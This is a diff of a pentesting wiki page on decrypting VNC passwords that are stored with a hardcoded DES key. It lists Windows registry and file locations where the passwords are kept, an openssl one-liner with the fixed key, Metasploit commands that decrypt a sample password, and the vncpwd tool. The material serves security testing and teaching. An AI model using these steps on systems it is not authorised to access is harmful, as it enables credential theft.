@@ -4,6 +4,12 @@
 
 VNC clients uses a hardcoded DES key to store credentials. If you have access to a VNC config file you may be able to decrypt it as **the same key is used across multiple product lines**.
 
+## Practice
+
+{% tabs %}
+{% tab title="Windows" %}
+On Windows systems, you may find the VNC password in the following files.
+
 | VNC Client   | Config File                                     | Password                                      |
 | ------------ | ----------------------------------------------- | --------------------------------------------- |
 | _RealVNC_    | HKEY\_LOCAL\_MACHINE\SOFTWARE\RealVNC\vncserver | Value: Password                               |
@@ -12,19 +18,13 @@ VNC clients uses a hardcoded DES key to store credentials. If you have access to
 | _TigerVNC_   | HKEY\_LOCAL\_USER\Software\TigerVNC\WinVNC4     | Value: Password                               |
 | _UltraVNC_   | C:\Program Files\UltraVNC\ultravnc.ini          | Value: passwd or passwd2                      |
 
-## Practice
-
-{% tabs %}
-{% tab title="UNIX-like" %}
-When you have extracted the hexadecimal-encoded password, using only native Linux tools we can decrypt it
+Once you have extracted the hexadecimal-encoded password, we can decrypt it using only native Linux tools
 
 ```bash
 echo -n <HEX_PASSWORD> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
 ```
-{% endtab %}
 
-{% tab title="Msfconsole" %}
-Msfconsole can be use to decrypt the password as follow (example with 17526b06234e5807 key)
+Msfconsole can also be used to decrypt the password as follows (example with key 17526b06234e5807)
 
 ```bash
 $> msfconsole
@@ -40,6 +40,16 @@ msf5 > irb
 >> Rex::Proto::RFB::Cipher.decrypt ["D7A514D8C556AADE"].pack('H*'), fixedkey
  => "Secure!\x00"
 >> 
+```
+{% endtab %}
+
+{% tab title="UNIX-like" %}
+On UNIX-type systems, the default password is stored in: `~/.vnc/passwd`
+
+We may decrypt it using the [vncpwd](https://github.com/jeroennijhof/vncpwd) tool
+
+```bash
+vncpwd <vnc password file>
 ```
 {% endtab %}
 {% endtabs %}
